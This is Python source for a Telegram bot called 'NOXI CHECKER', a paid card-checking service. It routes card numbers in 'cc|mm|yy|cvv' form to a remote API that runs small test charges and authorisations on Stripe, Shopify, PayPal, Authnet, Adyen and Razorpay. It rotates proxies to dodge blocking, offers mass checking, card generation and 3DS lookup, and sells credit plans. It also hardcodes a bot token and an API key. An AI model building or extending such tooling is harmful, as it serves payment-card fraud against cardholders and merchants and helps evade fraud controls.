import os
import time 
import logging
import asyncio 
import aiohttp
import re
import psutil
import random
import json
import html
import io
from datetime import datetime, timedelta
from io import BytesIO
import urllib.parse
import requests
import uuid
import threading
import sys

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, ApplicationHandlerStop
from telegram.error import BadRequest, TelegramError
from faker import Faker
import pytz

# Increase recursion limit for better stability
sys.setrecursionlimit(10000)

# === CONFIGURATION ===
TOKEN = "8469671075:AAFLnySqEs2oLjNn3i7ExKAdA-uxPHpQAx8" #Chage With Your Actul Bot Token#
OWNER_ID = 5994305183
AUTHORIZATION_CONTACT = "@WhyFlexy"
OFFICIAL_GROUP_LINK = "https://t.me/roh4nfx"
DEFAULT_FREE_CREDITS = 200

# === GLOBAL STATE ===
user_last_command = {}
AUTHORIZED_CHATS = set([-1002889801233])
REDEEM_CODES = {}
closed_commands = set()
user_cooldowns = {}

# Bot commands list
BOT_COMMANDS = [
    "start", "cmds", "gen", "bin", "chk", "mchk", "mass",
    "mtchk", "fk", "fl", "open", "status", "credits", "info",
    "scr", "sh", "seturl", "sp", "scr", "remove", "b3", "site",
    "vbv", "mvbv", "rz", "st", "st1", "hc", "at", "ad", "pp", "py", "oc",
    "msite", "mysites", "changeshsite", "msp", "admin", "adduser",
    "ban", "unban", "broadcast", "stats", "topusers", "backup"
]

# === LOGGING SETUP ===
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# === IMPORT DB FUNCTIONS ===
from db import (
    get_user, update_user, init_db, add_credits_to_user, 
    deduct_credits, get_user_stats, get_all_users, get_top_users,
    create_redeem_code, use_redeem_code, get_active_redeem_codes,
    backup_database, get_database_stats
)

# === GATEWAY API CONFIG ===
# Main Gateway URLs
GATEWAY_BASE_URL = "https://payment-gateway-api.onrender.com"

# Stripe APIs
STRIPE_AUTH_API = f"{GATEWAY_BASE_URL}/api/stripe/auth"
STRIPE_CHARGE_1_API = f"{GATEWAY_BASE_URL}/api/stripe/charge/1"
STRIPE_CHARGE_3_API = f"{GATEWAY_BASE_URL}/api/stripe/charge/3"

# Shopify APIs
SHOPIFY_CHARGE_098_API = f"{GATEWAY_BASE_URL}/api/shopify/charge/0.98"
SHOPIFY_CHARGE_1_API = f"{GATEWAY_BASE_URL}/api/shopify/charge/1"
SHOPIFY_CHARGE_10_API = f"{GATEWAY_BASE_URL}/api/shopify/charge/10"
SHOPIFY_MASS_API = f"{GATEWAY_BASE_URL}/api/shopify/mass"

# Other Gateways
PAYPAL_CHARGE_9_API = f"{GATEWAY_BASE_URL}/api/paypal/charge/9"
PAYPAL_CHARGE_1_API = f"{GATEWAY_BASE_URL}/api/paypal/charge/1"
AUTHNET_API = f"{GATEWAY_BASE_URL}/api/authnet/charge/1"
ADYEN_API = f"{GATEWAY_BASE_URL}/api/adyen/charge/1"
RAZORPAY_API = f"{GATEWAY_BASE_URL}/api/razorpay/charge/1"
OCEAN_API = f"{GATEWAY_BASE_URL}/api/ocean/charge/4"

# API Key
GATEWAY_API_KEY = "ccchkr_bot_2024_dec"

# === PROXY CONFIGURATION ===
PROXY_CONFIG_FILE = "proxy_config.json"
proxy_rotation_index = 0
static_proxies = {}
rotation_proxies = []

def load_proxy_config():
    """Load proxy configuration from JSON file"""
    global static_proxies, rotation_proxies
    
    try:
        if os.path.exists(PROXY_CONFIG_FILE):
            with open(PROXY_CONFIG_FILE, 'r') as f:
                config = json.load(f)
            
            static_proxies = config.get('static_proxies', {})
            rotation_proxies = config.get('rotation_proxies', [])
            
            logger.info(f"✅ Loaded {len(static_proxies)} static proxies")
            logger.info(f"✅ Loaded {len(rotation_proxies)} rotation proxies")
            
            if not static_proxies and not rotation_proxies:
                logger.warning("⚠️ No proxies loaded!")
        else:
            logger.error(f"❌ {PROXY_CONFIG_FILE} not found!")
            static_proxies = {}
            rotation_proxies = []
    except Exception as e:
        logger.error(f"Error loading proxy config: {e}")
        static_proxies = {}
        rotation_proxies = []

def format_proxy(proxy_string):
    """Format proxy string to aiohttp format"""
    if not proxy_string:
        return None
    
    try:
        parts = proxy_string.split(':')
        if len(parts) == 4:  # ip:port:username:password
            ip, port, username, password = parts
            return f"http://{username}:{password}@{ip}:{port}"
        elif len(parts) == 2:  # ip:port
            ip, port = parts
            return f"http://{ip}:{port}"
    except Exception as e:
        logger.error(f"Error formatting proxy: {e}")
    
    return None

def get_proxy(gateway_type="stripe_auth"):
    """Get proxy for gateway (static first, then rotation)"""
    # Try static proxy first
    if gateway_type in static_proxies:
        proxy = format_proxy(static_proxies[gateway_type])
        if proxy:
            logger.info(f"Using static proxy for {gateway_type}")
            return proxy
    
    # Fallback to rotation proxy
    global proxy_rotation_index
    if rotation_proxies:
        proxy_str = rotation_proxies[proxy_rotation_index]
        proxy_rotation_index = (proxy_rotation_index + 1) % len(rotation_proxies)
        proxy = format_proxy(proxy_str)
        if proxy:
            logger.info(f"Using rotation proxy #{proxy_rotation_index} for {gateway_type}")
            return proxy
    
    logger.warning(f"No proxy available for {gateway_type}")
    return None

# Load proxy config on startup
load_proxy_config()

# === HELPER FUNCTIONS ===
def escape_markdown_v2(text: str) -> str:
    if text is None:
        return ""
    special_chars = r"([_*\[\]()~`>#+\-=|{}.!])"
    return re.sub(special_chars, r"\\\1", str(text))

def escape_html(text: str) -> str:
    if text is None:
        return ""
    return html.escape(str(text), quote=False)

def get_level_emoji(level):
    if level is None:
        return "💡"
    level_lower = str(level).lower()
    if "gold" in level_lower:
        return "🌟"
    elif "platinum" in level_lower:
        return "💎"
    elif "premium" in level_lower:
        return "✨"
    elif "infinite" in level_lower:
        return "♾️"
    elif "corporate" in level_lower:
        return "💼"
    elif "business" in level_lower:
        return "📈"
    elif "standard" in level_lower or "classic" in level_lower:
        return "💳"
    return "💡"

def luhn_checksum(card_number):
    digits = [int(d) for d in str(card_number) if d.isdigit()]
    if not digits:
        return False
    total = 0
    num_digits = len(digits)
    parity = num_digits % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def get_plan_from_credits(credits):
    """Determine plan based on credits"""
    if credits >= 3000:
        return "Custom", "Premium+", 90
    elif credits >= 2000:
        return "Plus", "Premium", 60
    elif credits >= 1000:
        return "Premium", "Premium", 30
    elif credits >= 300:
        return "Starter", "Premium", 7
    else:
        return "Free", "Free", 0

def get_plan_expiry(duration_days):
    """Calculate plan expiry date"""
    if duration_days <= 0:
        return "N/A"
    
    expiry_date = datetime.now() + timedelta(days=duration_days)
    return expiry_date.strftime('%d-%m-%Y')

def get_user_data(user_id):
    user_data = get_user(user_id)
    if not user_data:
        now_str = datetime.now().strftime('%d-%m-%Y')
        update_user(
            user_id,
            credits=DEFAULT_FREE_CREDITS,
            plan="Free",
            status="Free",
            plan_expiry="N/A",
            keys_redeemed=0,
            registered_at=now_str
        )
        user_data = get_user(user_id)
    return user_data

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 3) -> bool:
    last_run = user_last_command.get(user_id, 0)
    current_time = time.time()
    if current_time - last_run < cooldown_seconds:
        remaining = round(cooldown_seconds - (current_time - last_run), 2)
        await update.effective_message.reply_text(
            f"⏳ Please wait {remaining} seconds before retrying.",
            parse_mode=ParseMode.HTML
        )
        return False
    user_last_command[user_id] = current_time
    return True

def consume_credit(user_id: int) -> bool:
    try:
        return deduct_credits(user_id, 1)
    except Exception as e:
        logger.error(f"Error consuming credit for user {user_id}: {e}")
        return False

# === MIDDLEWARE HANDLERS ===
async def group_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    message = update.effective_message

    if chat.type in ["group", "supergroup"]:
        if chat.id not in AUTHORIZED_CHATS:
            if message.entities:
                for ent in message.entities:
                    if ent.type == "bot_command":
                        cmd_text = message.text[ent.offset+1 : ent.offset+ent.length].split("@")[0].lower()
                        if cmd_text in BOT_COMMANDS:
                            await message.reply_text(
                                f"🚫 This group is not authorized to use this bot.\n\n"
                                f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                                f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                            )
                            raise ApplicationHandlerStop

# === START COMMAND AND MENU SYSTEM ===
BULLET_GROUP_LINK = "https://t.me/roh4nfx"
OFFICIAL_GROUP_LINK = "https://t.me/roh4nfx"
DEV_LINK = "https://t.me/WhyFlexy"

def build_final_card(*, user_id: int, username: str | None, credits: int, plan: str, status: str, plan_expiry: str, date_str: str, time_str: str) -> str:
    uname = f"@{username}" if username else "N/A"
    # Escape HTML for Telegram entities
    uname_escaped = escape_html(uname)
    plan_escaped = escape_html(plan)
    status_escaped = escape_html(status)
    plan_expiry_escaped = escape_html(plan_expiry)
    date_str_escaped = escape_html(date_str)
    time_str_escaped = escape_html(time_str)
    
    plan_emoji = "🎯" if plan == "Free" else "💎" if plan == "Premium" else "🌟" if plan == "Plus" else "⚡"

    return (
    "✦━━━━━━━━━━━━━━━━━━━━━━━━✦\n"
    "    ⚡ WELCOME TO NOXI CHECKER\n"
    "✦━━━━━━━━━━━━━━━━━━━━━━━━✦\n\n"
    f"• ID       : <code>{user_id}</code>\n"
    f"• Username : <code>{uname_escaped}</code>\n"
    f"• Credits  : <code>{credits}</code>\n"
    f"• Plan     : {plan_emoji} <code>{plan_escaped}</code>\n"
    f"• Status   : <code>{status_escaped}</code>\n"
    f"• Expiry   : <code>{plan_expiry_escaped}</code>\n"
    f"• Date     : <code>{date_str_escaped}</code>\n"
    f"• Time     : <code>{time_str_escaped}</code>\n\n"
    "➤ Please click the buttons below to proceed 👇"
)

def get_main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚪 Gates", callback_data="gates_menu"),
            InlineKeyboardButton("📦 Pricing", callback_data="tools_menu")
        ],
        [
            InlineKeyboardButton("💎 Owner", url=DEV_LINK),
            InlineKeyboardButton("🔐 3DS Lookup", callback_data="ds_lookup")
        ],
        [
            InlineKeyboardButton("👥 Official Group", url=OFFICIAL_GROUP_LINK)
        ]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logger.info(f"/start by {user.id} (@{user.username})")
    
    try:
        tz = pytz.timezone("Asia/Kolkata")
        now_dt = datetime.now(tz)
        date_str = now_dt.strftime("%d-%m-%Y")
        time_str = now_dt.strftime("%I:%M %p")
        
        user_data = get_user(user.id)
        if not user_data:
            # Create new user
            from db import create_user
            create_user(user.id, username=user.username, first_name=user.first_name, credits=DEFAULT_FREE_CREDITS)
            user_data = get_user(user.id)
        
        # Auto-update plan based on credits
        credits = int(user_data.get("credits", 0))
        plan, status, duration = get_plan_from_credits(credits)
        plan_expiry = get_plan_expiry(duration)
        
        # Update user with correct plan
        update_user(
            user.id,
            credits=credits,
            plan=plan,
            status=status,
            plan_expiry=plan_expiry
        )
        
        text = build_final_card(
            user_id=user.id,
            username=user.username,
            credits=credits,
            plan=plan,
            status=status,
            plan_expiry=plan_expiry,
            date_str=date_str,
            time_str=time_str,
        )
        
        await update.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=get_main_keyboard(),
            disable_web_page_preview=True
        )
        
    except Exception as e:
        logger.error(f"Error in /start command: {e}")
        await update.message.reply_text(
            "❌ An error occurred. Please try again later.",
            parse_mode=ParseMode.HTML
        )

# === CALLBACK HANDLERS ===
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    handlers = {
        "tools_menu": show_tools_menu,
        "gates_menu": gates_menu_handler,
        "auth_sub_menu": auth_sub_menu_handler,
        "charge_sub_menu": charge_sub_menu_handler,
        "shopify_gate": shopify_gate_handler,
        "autoshopify_gate": autoshopify_gate_handler,
        "stripe_gate": stripe_gate_handler,
        "stripe3_gate": stripe3_gate_handler,
        "shopify10_gate": shopify10_gate_handler,
        "authnet36_gate": authnet36_gate_handler,
        "ocean_gate": ocean_gate_handler,
        "adyen_gate": adyen_gate_handler,
        "paypal_gate": paypal_gate_handler,
        "razorpay1_gate": razorpay_gate_handler,
        "paypal1_gate": paypal1_gate_handler,
        "ds_lookup": ds_lookup_menu_handler,
        "back_to_start": back_to_start_handler,
    }

    handler = handlers.get(data)
    if handler:
        try:
            await handler(update, context)
        except Exception as e:
            logger.error(f"Error in callback handler {data}: {e}")
            await q.answer(f"❌ Error: {str(e)[:100]}", show_alert=True)
    else:
        await q.answer("⚠️ Unknown option selected.", show_alert=True)

async def back_to_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    user = q.from_user
    
    try:
        tz = pytz.timezone("Asia/Kolkata")
        now_dt = datetime.now(tz)
        date_str = now_dt.strftime("%d-%m-%Y")
        time_str = now_dt.strftime("%I:%M %p")
        
        user_data = get_user(user.id)
        if not user_data:
            credits = DEFAULT_FREE_CREDITS
            plan = "Free"
            status = "Free"
            plan_expiry = "N/A"
        else:
            credits = int(user_data.get("credits", 0))
            plan = str(user_data.get("plan", "Free"))
            status = str(user_data.get("status", "Free"))
            plan_expiry = str(user_data.get("plan_expiry", "N/A"))
        
        text = build_final_card(
            user_id=user.id,
            username=user.username,
            credits=credits,
            plan=plan,
            status=status,
            plan_expiry=plan_expiry,
            date_str=date_str,
            time_str=time_str,
        )
        
        try:
            await q.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=get_main_keyboard()
            )
        except Exception as e:
            logger.warning(f"Failed to edit message: {e}")
            await q.message.reply_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=get_main_keyboard(),
                disable_web_page_preview=True
            )
    except Exception as e:
        logger.error(f"Error in back_to_start_handler: {e}")
        await q.answer("❌ An error occurred.", show_alert=True)

async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    try:
        text = (
            "✧━✧💎PREMIUM PLANS💎✧━✧\n\n"
            "🚀 <b>Starter Plan</b>\n"
            "• Credits   : 300\n"
            "• Duration  : 7 Days\n"
            "• Price     : 3$\n"
            "────────────────────────\n"
            "🌟 <b>Premium Plan</b>\n"
            "• Credits   : 1000\n"
            "• Duration  : 30 Days\n"
            "• Price     : 10$\n"
            "────────────────────────\n"
            "💎 <b>Plus Plan</b>\n"
            "• Credits   : 2000\n"
            "• Duration  : 60 Days\n"
            "• Price     : 19$\n"
            "────────────────────────\n"
            "⚡ <b>Custom Plan</b>\n"
            "• Credits   : 3000\n"
            "• Duration  : Custom\n"
            "• Price     : Custom\n"
            "────────────────────────\n\n"
            "<i>💎All premium users will be provided with 0.98$ sites</i>\n"
            "<i>Full Help & Support for any issue</i>\n"
            "✦━━━━━━━━━━━━━━━━━━━━✦"
        )
        
        keyboard = [[InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]]
        await q.edit_message_text(
            text=text, 
            parse_mode=ParseMode.HTML, 
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error in show_tools_menu: {e}")
        await q.answer("❌ An error occurred.", show_alert=True)

async def gates_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    try:
        header = "━━❖🚪 GATES MENU 🚪❖━━\n\n"
        text = (
            f"{header}"
            "• <b>Auth Gateway</b> - Access authentication features\n"
            "• <b>Charge Gateway</b> - Access payment/charge features\n\n"
            "<i>💡 Need Assistance? 🌟 Full Support Available!</i>"
        )
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("⚡ Auth", callback_data="auth_sub_menu"),
                InlineKeyboardButton("💳 Charge", callback_data="charge_sub_menu")
            ],
            [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
        ])
        
        await q.edit_message_text(
            text=text, 
            parse_mode=ParseMode.HTML, 
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error in gates_menu_handler: {e}")
        await q.answer("❌ An error occurred.", show_alert=True)

async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    try:
        text = (
            "✦━━━✦🚪 AUTH GATES 🚪✦━━✦\n\n"
            "💎<b>Stripe Auth</b>💎\n"
            "• Single Check : <code>/chk cc|mm|yy|cvv</code>\n"
            "• Mass Check   : <code>/mass cc|mm|yy|cvv</code>\n"
            "• Status       : Active ✅\n"
            "• Gateway      : Stripe Auth\n"
            "────────────────────────\n\n"
            "💎<b>Braintree Premium</b>💎\n"
            "• Single Auth  : <code>/b3 cc|mm|yy|cvv</code>\n"
            "• Status       : Active ✅\n"
            "• Gateway      : Braintree Auth\n"
            "────────────────────────\n\n"
            "🛡️✨ All Gateways Available | No Rate Restrictions!\n"
            "✦═════════════✦"
        )
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")]
        ])
        
        await q.edit_message_text(
            text=text, 
            parse_mode=ParseMode.HTML, 
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error in auth_sub_menu_handler: {e}")
        await q.answer("❌ An error occurred.", show_alert=True)

async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    try:
        text = "❖══💳 CHARGE GATEWAYS 💳══❖\n\n💎✨Select a Charge Gate Below✨💎"
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("💸 Shopify 0.98$", callback_data="shopify_gate"),
                InlineKeyboardButton("⚡ Auto Shopify", callback_data="autoshopify_gate")
            ],
            [
                InlineKeyboardButton("💳 Stripe 1$", callback_data="stripe_gate"),
                InlineKeyboardButton("💳 Stripe 3$", callback_data="stripe3_gate")
            ],
            [
                InlineKeyboardButton("💵 Shopify 10$", callback_data="shopify10_gate"),
                InlineKeyboardButton("🏦 Authnet 1.0$", callback_data="authnet36_gate")
            ],
            [
                InlineKeyboardButton("🌊 Ocean Payments 4$", callback_data="ocean_gate"),
                InlineKeyboardButton("💳 Adyen 1$", callback_data="adyen_gate")  
            ],
            [
                InlineKeyboardButton("💰 PayPal 1$", callback_data="paypal1_gate"),
                InlineKeyboardButton("💰 PayPal Payments 9$", callback_data="paypal_gate")
            ],
            [
                InlineKeyboardButton("⚡ Razorpay 1₹", callback_data="razorpay1_gate")
            ],
            [
                InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")
            ]
        ])
        
        await q.edit_message_text(
            text=text, 
            parse_mode=ParseMode.HTML, 
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error in charge_sub_menu_handler: {e}")
        await q.answer("❌ An error occurred.", show_alert=True)

# === GATE HANDLERS ===
async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ SHOPIFY 0.98$ ═══✦\n\n"
        "• CMD   : <code>/sh</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Shopify</i>\n"
        "• Gateway Charge   : <i>$0.98</i>\n"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def razorpay_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ RAZORPAY 1₹ ═══✦\n\n"
        "• CMD       : <code>/rz</code>\n"
        "• Status    : <i>Active ✅</i>\n"
        "• Gateway  : <i>Razorpay</i>\n"
        "• Gateway Charge : <i>₹1</i>\n"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ Stripe 1$ ═══✦\n\n"
        "• CMD   : <code>/st</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Stripe</i>\n"
        "• Gateway Charge   : <i>$1</i>\n"
        "✦══════════════✦"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def stripe3_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ Stripe 3$ ═══✦\n\n"
        "• CMD   : <code>/st1</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Stripe</i>\n"
        "• Gateway Charge   : <i>$3</i>\n"
        "✦════════════✦"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def shopify10_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ Shopify 10$ ═══✦\n\n"
        "• CMD   : <code>/hc</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Shopify</i>\n"
        "• Gateway Charge   : <i>$10</i>\n"
        "✦═══════════════✦"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ AuthNet 1$ ═══✦\n\n"
        "• CMD   : <code>/at</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Authnet</i>\n"
        "• Gateway Charge   : <i>$1.0</i>\n"
        "✦══════════════✦"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def ocean_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ Ocean Payments 4$ ═══✦\n\n"
        "• CMD   : <code>/oc</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Ocean Payments</i>\n"
        "• Gateway Charge   : <i>$4</i>\n"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def adyen_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ Adyen 1$ ═══✦\n\n"
        "• CMD   : <code>/ad</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>Adyen</i>\n"
        "• Gateway Charge   : <i>$1</i>\n"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def paypal_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ PayPal 9$ ═══✦\n\n"
        "• CMD   : <code>/py</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>PayPal</i>\n"
        "• Gateway Charge   : <i>$9.00</i>\n"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def paypal1_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "✦═══ PayPal 1$ ═══✦\n\n"
        "• CMD   : <code>/pp</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>PayPal</i>\n"
        "• Gateway Charge   : <i>$1.00</i>\n"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
            InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
        ]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auto Shopify gate handler"""
    try:
        if update.callback_query:
            q = update.callback_query
            await q.answer()
        else:
            return
        
        text = (
            "✦═══ Auto Shopify ═══✦\n\n"
            "• CMD   : <code>/sp</code>\n"
            "• Mass     : <code>/msp</code>\n"
            "• Own Site  : <code>/seturl &lt;site&gt;</code>\n"
            "• Multiple Sites : <code>/adurls &lt;site&gt;</code>\n\n"
            "• Status  : <i>Active ✅</i>\n"
            "• Gateway Charge : <i>Shopify</i>\n"
            "✦═════════════════✦"
        )
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu"),
                InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")
            ]
        ])
        
        try:
            await q.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
        except Exception as e:
            logger.warning(f"Failed to edit message: {e}")
            if update.effective_message:
                await update.effective_message.reply_text(
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard,
                    disable_web_page_preview=True
                )
                
    except Exception as e:
        logger.error(f"Error in autoshopify_gate_handler: {e}")
        if update.callback_query:
            await update.callback_query.answer("❌ An error occurred.", show_alert=True)
        
